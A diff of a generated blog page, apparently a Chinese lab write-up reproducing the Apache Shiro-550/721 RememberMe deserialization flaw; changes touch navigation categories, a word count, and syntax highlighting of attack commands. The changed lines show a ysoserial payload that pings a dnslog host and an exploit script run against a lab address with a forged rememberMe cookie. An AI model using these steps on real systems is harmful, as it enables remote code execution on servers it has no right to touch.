@@ -109,6 +109,13 @@ Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录�
       </li>
       
       <li>
+        <a href="/categories/%E6%B8%97%E9%80%8F">
+          
+          <span>渗透</span>
+        </a>
+      </li>
+      
+      <li>
         <a href="/categories/SRC">
           
           <span>SRC</span>
@@ -133,20 +140,6 @@ Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录�
         <a href="/categories/Crypto">
           
           <span>Crypto</span>
-        </a>
-      </li>
-      
-      <li>
-        <a href="/categories/%E5%89%8D%E7%AB%AF">
-          
-          <span>前端</span>
-        </a>
-      </li>
-      
-      <li>
-        <a href="/categories/Android">
-          
-          <span>Android</span>
         </a>
       </li>
       
@@ -280,6 +273,14 @@ Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录�
               
                 <li>
 
+                  <a href="/categories/%E6%B8%97%E9%80%8F " style="margin-left:75px">
+				  
+		          <span>渗透</span>
+                  </a>
+                </li>
+              
+                <li>
+
                   <a href="/categories/SRC " style="margin-left:75px">
 				  
 		          <span>SRC</span>
@@ -307,22 +308,6 @@ Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录�
                   <a href="/categories/Crypto " style="margin-left:75px">
 				  
 		          <span>Crypto</span>
-                  </a>
-                </li>
-              
-                <li>
-
-                  <a href="/categories/%E5%89%8D%E7%AB%AF " style="margin-left:75px">
-				  
-		          <span>前端</span>
-                  </a>
-                </li>
-              
-                <li>
-
-                  <a href="/categories/Android " style="margin-left:75px">
-				  
-		          <span>Android</span>
                   </a>
                 </li>
               
@@ -582,7 +567,7 @@ Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录�
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    593
+                    587
                 </div>
                 
 
@@ -642,7 +627,7 @@ Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录�
 <p>登录，然后取出cookie</p>
 <p><img src="/../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306151413738.png"></p>
 <h4 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h4><p>先用<code>ysoserial</code>生成class</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -jar ysoserial.jar CommonsCollections1 &quot;ping 4997u3.dnslog.cn&quot; &gt; payload.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -jar ysoserial.jar CommonsCollections1 <span class="token string">"ping 4997u3.dnslog.cn"</span> <span class="token operator">></span> payload.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后再用exp跑</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#https://github.com/3ndz/Shiro-721</span>
@@ -699,7 +684,7 @@ Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录�
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'rememberMe cookies:'</span><span class="token punctuation">)</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python shiro_exp.py http:&#x2F;&#x2F;192.168.110.131:41906&#x2F;account [rememberMeCookie] payload.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python shiro_exp.py http://192.168.110.131:41906/account <span class="token punctuation">[</span>rememberMeCookie<span class="token punctuation">]</span> payload.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>地址为登录后的界面</p>
 <p><img src="/../images/Shiro550-Shiro712%E5%A4%8D%E7%8E%B0/image-20220306152320554.png"></p>
